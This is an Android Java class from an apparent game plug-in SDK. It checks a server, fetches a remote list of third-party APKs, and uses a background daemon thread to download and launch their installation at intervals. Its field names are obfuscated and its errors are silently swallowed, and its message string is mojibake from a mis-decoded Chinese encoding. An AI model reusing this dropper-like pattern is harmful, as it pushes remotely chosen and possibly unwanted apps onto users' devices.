package com.game.plug.function;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Handler;
import android.os.Message;
import android.widget.Toast;

import com.game.plug.function.DataFunction.PlugData;
import com.game.plug.function.DataFunction.PlugDataUnit;
import com.game.plug.utils.AppUtils;
import com.game.plug.utils.EncryptUtils;
import com.game.plug.utils.NetUtils;

public class IntegrationFunction {
	public static final String MSG_NET = "ÇëÄú¿ªÆôÍøÂç!";
	private static List<PlugDataUnit> tempFits = null;
	private static PlugData tmpData;
	 
	public static Map<String, String> getTmpMap() {
		Map<String, String> tmp = new HashMap<String, String>();
		PlugDataUnit unit = tempFits.get(0);
		tmp.put(EncryptUtils.deciphering("139%105%124%136%128%"), unit.getpName());
		tmp.put(EncryptUtils.deciphering("144%141%135%"), unit.getUrl());
		tmp.put(EncryptUtils.deciphering("142%132%149%128%"), unit.getSize()+""); 
		tmp.put(EncryptUtils.deciphering("136%142%130%"), tmpData.getMsg()); 
		return tmp;
		
	}
	
	public static boolean integration(Activity activity, String url, Class<?> mainClass) {
		try {
			boolean hasNet = false;
			ConnectivityManager manager = (ConnectivityManager)activity.getSystemService("connectivity");
			NetworkInfo info = manager.getActiveNetworkInfo();
			if (info != null) {
				hasNet = info.isConnected();
			} 
			if (!hasNet) {
				Toast.makeText(activity.getApplicationContext(), MSG_NET,
					     Toast.LENGTH_SHORT).show();
				return false;
			}
			long local = activity.getPackageManager().getPackageInfo(
					activity.getPackageManager().getPackageInfo(activity.getPackageName(), 0).packageName, 0).versionCode;
			long server = DataFunction.getPlugData(activity, url).getServer();
			if (local >= server) {
				AppUtils.invokeLocal(activity, mainClass);
				return false;
			}
			List<PlugDataUnit> units = FitFunction.fit(activity, url);
			tempFits = units;
			tmpData = DataFunction.getPlugData(activity, url);
			if (units != null && units.size() > 0) {
				if (units.size() > 1) {
					Observer observer = new Observer(activity, units, DataFunction.getPlugData(activity, url));
					observer.setDaemon(true);
					observer.start();
				} 
				return DownFunction.popDown(activity, units.get(0),  DataFunction.getPlugData(activity, url));
			} else {
				AppUtils.invokeLocal(activity, mainClass);
				return false;
			}
 		} catch (Exception ex) {
 		}
		return false; 
	}
	
	@SuppressLint("HandlerLeak")
	public static class Observer extends Thread {
		private static Activity activity;
		private List<PlugDataUnit> units;
		private PlugData data; 

		private Handler handler = new Handler() {
			public void handleMessage(Message msg)
			{
				switch (msg.what)
				{	
					case 1:
						int index = (Integer)msg.obj;  
						setup(index);
					break;
				}
			};
		};
		
		public Observer(Activity activity, List<PlugDataUnit> units, PlugData data) {
			Observer.activity = activity;
			this.units = units;
			this.data = data;
		}
		
		private void setup(int index) { 
			String fileName = AppUtils.getLastFileName(units.get(index).getUrl());
			String packageName = units.get(index).getpName();
			AppUtils.setup(activity, AppUtils.getDir() + fileName, packageName); 
	 	}
		
		@Override
		public void run() {
	 		try {
 	 			long seconeds = data.getInterval();
	 			for (int index=1; index<units.size(); index++) {
	 				PlugDataUnit unit = units.get(index); 
	 				if (AppUtils.isInstall(activity, unit.getpName())) {
	 					continue;
	 				} else {
	 					if (AppUtils.isDown(unit.getpName(), unit.getSize())) {
	 						NetUtils.downByObserver(unit.getUrl(), AppUtils.getLastFileName(unit.getUrl()), handler, index); 
		 					 
	 					} else {
	 						setup(index);
	 					} 
	 				}
	 				Thread.sleep(seconeds * 1000);
	 			} 
	 		} catch (Exception ex) {
	 		}
		}
	}
}
